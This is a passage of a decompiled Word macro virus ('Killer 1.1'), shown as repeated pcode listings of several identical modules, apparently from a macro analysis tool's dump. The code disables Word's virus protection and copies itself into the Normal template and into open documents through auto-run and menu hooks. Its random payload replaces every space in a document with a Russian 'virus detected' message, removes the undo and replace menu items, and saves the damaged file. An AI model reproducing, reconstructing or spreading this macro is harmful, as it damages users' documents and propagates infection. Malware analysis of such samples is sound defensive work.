' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer25 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer26 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer27 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer28 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
